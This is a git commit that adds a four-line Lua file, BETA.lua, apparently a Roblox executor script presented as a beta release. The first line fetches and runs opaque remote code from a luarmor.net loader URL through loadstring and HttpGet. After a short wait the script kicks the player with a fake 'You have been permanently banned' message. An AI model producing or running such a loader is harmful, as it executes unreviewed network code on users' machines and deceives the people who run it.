d529e48c51fa89a853523f3a2aac65d6ae14ea9a
2133121233 <106486318+2133121233@users.noreply.github.com>
2024-04-25 00:07:27 -0300

    Create BETA.lua

---
+++ BETA.lua
@@ -0,0 +1,4 @@
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
+wait(7)
+game.Players.LocalPlayer:Kick("You have been permanently banned")
+-- script by hyper!!!!
